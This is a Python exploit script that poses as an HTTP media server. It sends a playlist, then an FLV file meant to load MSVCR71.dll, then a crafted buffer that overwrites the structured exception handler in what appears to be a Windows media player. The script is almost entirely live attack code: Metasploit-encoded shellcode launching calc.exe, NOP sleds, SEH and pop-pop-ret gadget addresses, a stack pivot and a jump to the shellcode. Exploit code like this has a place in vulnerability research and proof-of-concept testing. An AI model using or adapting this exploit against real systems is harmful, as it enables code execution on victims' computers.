import socket
import sys
s = socket.socket()         # Create a socket object
if(len(sys.argv) < 3):
  print "[x] Please enter an IP and port to listen to."
  print "[x] " + "./" + sys.argv[0] + " ip port"
  exit()
host = sys.argv[1]	    # Ip to listen to.
port = int(sys.argv[2])     # Reserve a port for your service.
s.bind((host, port))        # Bind to the port
print "[*] Listening on port " + str(port)
s.listen(5)                 # Now wait for client connection.
c, addr = s.accept()        # Establish connection with client.
# Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
print(('[*] Sending M3U File to ', addr))
c.recv(1024)
response = "HTTP/1.1 200 OK\r\n"
response += "Date: Fri, 09 Jan 2015 20:44:48 GMT\r\n"
response += "Server: Apache/2.4.10 (Ubuntu)\r\n"
response += "Last-Modified: Fri, 09 Jan 2015 20:44:25 GMT\r\n"
response += "ETag: \"3e-50c3e38dd7191\"\r\n"
response += "Accept-Ranges: bytes\r\n"
response += "Content-Length: 68\r\n"
response += "Connection: close\r\n"
response += "Content-Type: audio/x-mpegurl\r\n\r\n"
response += "#EXTM3U\x0a"
response += "http://" + host + ":" + str(port) +  "/boom.flv\x0a"
response += "http://" + host + ":" + str(port) +  "/\x0a\r\n\r\n"
c.send(response)
c.close()

c, addr = s.accept()     # Establish connection with client.
# Sending media file to force the loading of MSVCR71.dll file so we can use it later.
print(('[*] Sending FLV File to ', addr))
c.recv(1024)
content = ""
with open('1.flv', 'r') as content_file:
	content = content_file.read()
response = "HTTP/1.1 200 OK\r\n"
response += "Date: Fri, 09 Jan 2015 20:44:48 GMT\r\n"
response += "Server: Apache/2.4.10 (Ubuntu)\r\n"
response += "Last-Modified: Fri, 09 Jan 2015 20:44:25 GMT\r\n"
response += "ETag: \"3e-50c3e38dd7191\"\r\n"
response += "Accept-Ranges: bytes\r\n"
response += "Content-Length: " + str(len(content)) + "\r\n"
response += "Connection: close\r\n"
response += "Content-Type: video/x-flv\r\n\r\n"
c.send(response + content +"\r\n\r\n")
c.close()
# Sending the payload.
c, addr = s.accept()     # Establish connection with client.
print(('[*] Sending Payload to ', addr))
c.recv(1024)
# calc.exe nothing fancy. used metasploit with shikata with one round (two and three rounds produced bad chars be carefull if you're gonna change this).
# Bad chars are \x0a\x0d\x00
buf =  ""
buf += "\xbb\xe4\xf3\xb8\x70\xda\xc0\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x33\x31\x58\x12\x83\xc0\x04\x03\xbc\xfd\x5a"
buf += "\x85\xc0\xea\x12\x66\x38\xeb\x44\xee\xdd\xda\x56\x94"
buf += "\x96\x4f\x67\xde\xfa\x63\x0c\xb2\xee\xf0\x60\x1b\x01"
buf += "\xb0\xcf\x7d\x2c\x41\xfe\x41\xe2\x81\x60\x3e\xf8\xd5"
buf += "\x42\x7f\x33\x28\x82\xb8\x29\xc3\xd6\x11\x26\x76\xc7"
buf += "\x16\x7a\x4b\xe6\xf8\xf1\xf3\x90\x7d\xc5\x80\x2a\x7f"
buf += "\x15\x38\x20\x37\x8d\x32\x6e\xe8\xac\x97\x6c\xd4\xe7"
buf += "\x9c\x47\xae\xf6\x74\x96\x4f\xc9\xb8\x75\x6e\xe6\x34"
buf += "\x87\xb6\xc0\xa6\xf2\xcc\x33\x5a\x05\x17\x4e\x80\x80"
buf += "\x8a\xe8\x43\x32\x6f\x09\x87\xa5\xe4\x05\x6c\xa1\xa3"
buf += "\x09\x73\x66\xd8\x35\xf8\x89\x0f\xbc\xba\xad\x8b\xe5"
buf += "\x19\xcf\x8a\x43\xcf\xf0\xcd\x2b\xb0\x54\x85\xd9\xa5"
buf += "\xef\xc4\xb7\x38\x7d\x73\xfe\x3b\x7d\x7c\x50\x54\x4c"
buf += "\xf7\x3f\x23\x51\xd2\x04\xdb\x1b\x7f\x2c\x74\xc2\x15"
buf += "\x6d\x19\xf5\xc3\xb1\x24\x76\xe6\x49\xd3\x66\x83\x4c"
buf += "\x9f\x20\x7f\x3c\xb0\xc4\x7f\x93\xb1\xcc\xe3\x72\x22"
buf += "\x8c\xcd\x11\xc2\x37\x12"

buf = buf + "\x90" * 2048

nopsize = 8236 - len(buf)
nops = "\x90" * nopsize
#Jump the 6 bytes.
nseh =  "\xeb\x06\x90\x90"
# 0x7c373b7f : pop edi # pop esi # ret  | ascii {PAGE_EXECUTE_READ} [MSVCR71.dll] : Thanks mona.py :)
seh = "\x7f\x3b\x37\x7c"
# Adding (subtracting with negative number to avoid null) stack pivot so esp will point to the beginning of the buffer. 
addesp = "\x81\xec\xf4\xfb\xff\xff"
# jumpping to esp.
jmpesp = "\xff\xe4"
# Zero all the registers for no obvious reasons but being paranoid :)
zeroall = "\x31\xc0" + "\x31\xdb" + "\x31\xc9" + "\x31\xd2" + "\x31\xf6" + "\x31\xff"
# More garbage data to make sure we trigger the exception handler rotine.
garbage = "\x41" * 8000
c.send(nops + buf + nseh + seh + addesp + zeroall + jmpesp + garbage + "\x00")
c.close()
s.close()